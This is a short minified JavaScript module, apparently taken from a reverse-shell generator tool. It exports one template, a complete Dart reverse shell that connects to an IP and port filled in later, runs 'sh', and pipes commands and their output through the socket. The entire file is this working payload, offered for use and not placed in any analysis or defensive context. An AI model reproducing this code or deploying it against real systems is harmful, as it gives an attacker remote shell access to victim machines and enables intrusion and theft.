const t=[{title:"Dart reverse shell",template:`import 'dart:io';
import 'dart:convert';

main() {
  Socket.connect("{ip}", {port}).then((socket) {
    socket.listen((data) {
      Process.start('sh', []).then((Process process) {
        process.stdin.writeln(new String.fromCharCodes(data).trim());
        process.stdout
          .transform(utf8.decoder)
          .listen((output) { socket.write(output); });
      });
    },
    onDone: () {
      socket.destroy();
    });
  });
}`,description:"Dart reverse shell connecting to specified IP and port, piping shell input/output through socket."}],e={commands:t};export{t as commands,e as default};
